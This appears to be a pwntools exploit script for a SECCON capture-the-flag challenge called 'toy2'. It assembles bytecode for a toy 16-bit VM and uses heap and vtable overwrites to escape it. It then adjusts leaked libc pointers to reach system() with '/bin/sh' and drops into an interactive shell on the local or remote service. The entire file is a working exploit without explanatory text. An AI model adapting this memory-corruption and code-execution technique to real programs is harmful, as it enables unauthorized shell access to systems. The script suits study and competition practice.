from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './toy2'
HOST = 'toy-2.seccon.games'
HOST = '0'
PORT =   5000
elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        #script += "b *0x%x\n"%(PIE+bp)
        #script += "b *0x%x if $rax==0xb\n"%(PIE+bp)
        script += "b *0x%x if $rax==0x7\n"%(PIE+bp)
    #script += "b *0x%x \n"%(PIE+bp)
    #script += "d\n"
    #script += "b *0x%x\n"%(PIE+0x27be)
    script += "c\n"
    #script += "dis\n"
    script += "b *0x%x \n"%(PIE+bp)
    script += "c\n"

    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))



def op_jmp(addr):
    return p16(addr|0x0<<12)
def op_adc(addr):
    return p16(addr|0x1<<12)
def op_xor(addr):
    return p16(addr|0x2<<12)
def op_sbc(addr):
    return p16(addr|0x3<<12)
def op_ror(addr=0x444):
    return p16(addr|0x4<<12)
def op_tat(addr=0x555):
    return p16(addr|0x5<<12)
def op_or(addr):
    return p16(addr|0x6<<12)
def op_ill(addr=0x777):
    return p16(addr|0x7<<12)
def op_and(addr):
    return p16(addr|0x8<<12)
def op_ldc(addr):
    return p16(addr|0x9<<12)
def op_bcc(addr):
    return p16(addr|0xa<<12)
def op_bne(addr):
    return p16(addr|0xb<<12)
def op_ldi(addr=0xccf):
    return p16(addr|0xc<<12)
def op_stt(addr=0xddd):
    return p16(addr|0xd<<12)
def op_lda(addr):
    return p16(addr|0xe<<12)
def op_sta(addr):
    return p16(addr|0xf<<12)

r = start()
if args.D:
    debug(r, [0x2818])

payload = b''
payload += op_lda(0xf00)# check marker
payload += op_ror()# check marker
payload += op_bne(0x80a)# go second loop

payload += op_lda(0x800)# where
payload += op_tat()
payload += op_lda(0x802)# what
payload += op_stt()

payload += b'\xcc'*0x2
payload += op_jmp(0x80a-0x10)
payload += b'\xcc'*0xc
def memcpy(dst, src, leng):
    global payload
    for i in range(leng//2):
        payload += op_lda(src+i*2)
        payload += op_sta(dst+i*2)

memcpy(0xff9, 0x802-0x10, 2)#leng

memcpy(0xc00-0x10, 0xff0, 8) #heap
memcpy(0xc08-0x10, 0xc00-0x10, 8) #heap

payload += op_lda(0xff0)
payload += op_sbc(0x804-0x10)
for i in range(40):
    payload += op_xor(0)

payload += op_sta(0xff0)
memcpy(0xc10+8, 0, 8) # vtable
memcpy(0xc18+0x8, 0xc10+0x8, 8)

payload += op_lda(0x806+8)
payload += op_adc(0xc08+8)
payload += op_sta(0xc08+8)

payload += op_tat()
payload += op_lda(0xc18+8)
payload += op_sbc(0x808+8)
payload += op_sta(0xc18+8)

memcpy(0, 0xc08+0x8, 8)
#memcpy(0x1000, 0xc00+0x8, 2)
##
payload += op_lda(0xc00+8)# 
payload += op_tat()
payload += op_lda(0x80e+0x8)
payload += op_stt()
payload += op_ill()



payload = payload.ljust(0x400, b'\x77')
payload += op_tat()
payload += op_tat()
payload += op_tat()

# some_stdc-->system: -0x2b9a10
payload += op_lda(0x810-0x10)# 
payload += op_tat()
payload += op_ldi()
payload += op_sta(0xc18-0x10)

payload += op_lda(0x812-0x10)# 
payload += op_tat()
payload += op_ldi()
payload += op_sta(0xc1a-0x10)

payload += op_lda(0x814-0x10)# 
payload += op_tat()
payload += op_ldi()
payload += op_sta(0xc1c-0x10)

# sub stdc pointer
# 0x28d300
payload += op_lda(0xc1a-0x10)
payload += op_sbc(0x816-0x10)
payload += op_sta(0xc1a-0x10)

payload += op_lda(0xc18-0x10)
payload += op_sbc(0x818-0x10)
payload += op_sta(0xc18-0x10)

payload += op_lda(0xc08-0x10)
payload += op_adc(0x81a-0x10)
payload += op_sta(0xc08-0x10)

memcpy(0xc10-0x10, 0xc08-0x10, 8)


payload += op_lda(0x81e-0x10)
payload += op_sta(0xc10-0x10)

payload += op_lda(0x820-0x10)
payload += op_sta(0xc12-0x10)

payload += op_lda(0x822-0x10)
payload += op_sta(0xc14-0x10)

payload += op_lda(0x824-0x10)
payload += op_sta(0xc16-0x10)

# 0x0018483e: mov rdi, rax; call qword ptr [rbx+0x378];
memcpy(0x370-0x10, 0xc18-0x10, 8)

payload += op_lda(0x372-0x10)
payload += op_sbc(0x826-0x10)
payload += op_sta(0x372-0x10)

payload += op_lda(0x370-0x10)
payload += op_sbc(0x828-0x10)
payload += op_sta(0x370-0x10)


# set ip to far enough to esacape execution properly
payload += op_lda(0x802-0x10)# 
payload += op_tat()
payload += op_lda(0x81c-0x10)
payload += op_stt()

payload += op_ill()

payload = payload.ljust(0x800, b'\x02')
payload += b'\xff\xc8' #0
payload += b'\xff\xff' #2

payload += b'\x18\x00' #4

payload += b'\x00\x0c' #6
payload += p16(0x4c70-0x27be) #8
payload += p16(0x400-0x10) #a
payload += p16(0) #c
payload += p16(0x1008) #e
payload += p16(0x1048-0x10) #x10
payload += p16(0x104a-0x10)# x12
payload += p16(0x104c-0x10)# x14
#payload += p16(0x29)# x16 !!!!!!
#payload += p16(0xd77e)# x18
payload += p16(0x16)# x16 !!!!!!
payload += p16(0x1202)# x18
payload += p16(0x10)# x1a
payload += p16(0x1000) #1c

#/bin/sh
payload += p16(0x622f)# x1e
payload += p16(0x6e69)# x20
payload += p16(0x732f)# x22
payload += p16(0x68)# x24

# do system
#payload += p16(0x29)# x26 
#payload += p16(0xd77e)# x28
payload += p16(0x13)# x26 
payload += p16(0xc0fe)# x28


payload = payload.ljust(0xc00, b'\x05')

payload = payload.ljust(0x1000, b'\x07')

r.send(payload)

r.interactive()
r.close()

